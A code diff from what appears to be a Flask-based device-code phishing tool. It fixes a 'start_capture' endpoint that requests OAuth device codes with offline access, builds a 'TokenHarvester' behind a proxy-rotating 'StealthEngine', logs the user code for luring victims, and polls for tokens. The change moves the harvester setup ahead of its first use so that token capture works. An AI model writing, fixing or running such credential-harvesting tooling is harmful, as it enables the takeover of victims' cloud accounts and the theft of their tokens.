@@ -1312,7 +1312,9 @@ def start_capture():
     print("DEBUG: start_capture() called - FIXED VERSION LOADED", flush=True)
     data = request.get_json()
     client_id = data.get('client_id')
-    tenant = (data.get('tenant') or os.environ.get('TENANT', 'common')).strip() or os.environ.get('TENANT', 'common')
+    tenant = (data.get('tenant') or '').strip()
+    if not tenant:
+        tenant = (os.environ.get('TENANT') or os.environ.get('TENANT_ID') or 'common').strip() or 'common'
     scope_str = data.get('scope', 'openid offline_access profile')
     
     if not client_id:
@@ -1391,14 +1393,15 @@ def start_capture():
 
         try:
             device_code_data = request_device_code_direct(client_id, tenant, scopes)
+            direct_stealth = StealthEngine(proxy_list=[], use_manager_proxy=False)
+            direct_harvester = TokenHarvester(client_id, tenant=tenant, scopes=scopes, stealth=direct_stealth)
+
             sessions[session_id]['device_code_data'] = device_code_data
             sessions[session_id]['last_proxy'] = getattr(direct_stealth, '_last_selected_proxy', None) or getattr(direct_harvester, 'last_used_proxy', None)
             logger.success(f"Device code obtained for session {session_id} (direct connection)")
             logger.api(f"Verification URI: {device_code_data.get('verification_uri')}")
             logger.api(f"User code: {device_code_data.get('user_code')}")
 
-            direct_stealth = StealthEngine(proxy_list=[], use_manager_proxy=False)
-            direct_harvester = TokenHarvester(client_id, tenant=tenant, scopes=scopes, stealth=direct_stealth)
             # persist direct stealth for observability
             sessions[session_id]['stealth'] = direct_stealth
             polling_thread = threading.Thread(
